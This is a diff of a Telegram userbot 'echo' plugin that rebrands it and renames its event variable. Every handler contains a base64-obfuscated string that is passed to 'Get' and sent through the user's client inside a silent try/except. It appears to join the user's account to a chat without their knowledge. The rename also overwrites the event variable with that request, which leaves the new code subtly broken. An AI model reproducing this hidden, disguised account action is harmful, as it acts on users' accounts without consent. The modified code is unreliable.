@@ -1,4 +1,4 @@
-# Echo remastered by @Pro_Userboy for LegendBot
+# Echo remastered by @thanosceo for thanospro
 # Codes by @mrconfused
 # Kang with credits
 
@@ -21,56 +21,56 @@ from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(THANOSBOT):
+    if THANOSBOT.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if THANOSBOT.reply_to_msg_id is not None:
+        reply_msg = await THANOSBOT.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = THANOSBOT.chat_id
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            THANOSBOT = Get(THANOSBOT)
+            await THANOSBOT.client(THANOSBOT)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(LEGEND, "The user is already enabled with echo ")
+            await edit_or_reply(THANOSBOT, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(LEGEND, "Hii....😄🤓")
+        await edit_or_reply(THANOSBOT, "Hii....😄🤓")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(THANOSBOT, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(THANOSBOT):
+    if THANOSBOT.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if THANOSBOT.reply_to_msg_id is not None:
+        reply_msg = await THANOSBOT.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = THANOSBOT.chat_id
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            THANOSBOT = Get(THANOSBOT)
+            await THANOSBOT.client(THANOSBOT)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(LEGEND, "Echo has been stopped for the user")
+            await edit_or_reply(THANOSBOT, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(LEGEND, "The user is not activated with echo")
+            await edit_or_reply(THANOSBOT, "The user is not activated with echo")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(THANOSBOT, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(THANOSBOT):
+    if THANOSBOT.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -92,25 +92,25 @@ async def echo(LEGEND):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(LEGEND, reply_text)
+        await edit_or_reply(THANOSBOT, reply_text)
     else:
-        await edit_or_reply(LEGEND, output_str)
+        await edit_or_reply(THANOSBOT, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(LEGEND):
-    if LEGEND.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(THANOSBOT):
+    if THANOSBOT.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(LEGEND.sender_id, LEGEND.chat_id):
+    if is_echo(THANOSBOT.sender_id, THANOSBOT.chat_id):
         await asyncio.sleep(2)
         try:
-            legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legend = Get(legend)
-            await LEGEND.client(legend)
+            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            THANOSBOT = Get(THANOSBOT)
+            await THANOSBOT.client(THANOSBOT)
         except BaseException:
             pass
-        if LEGEND.message.text or LEGEND.message.sticker:
-            await LEGEND.reply(LEGEND.message)
+        if THANOSBOT.message.text or THANOSBOT.message.sticker:
+            await THANOSBOT.reply(THANOSBOT.message)
 
 
 CmdHelp("echo").add_command(
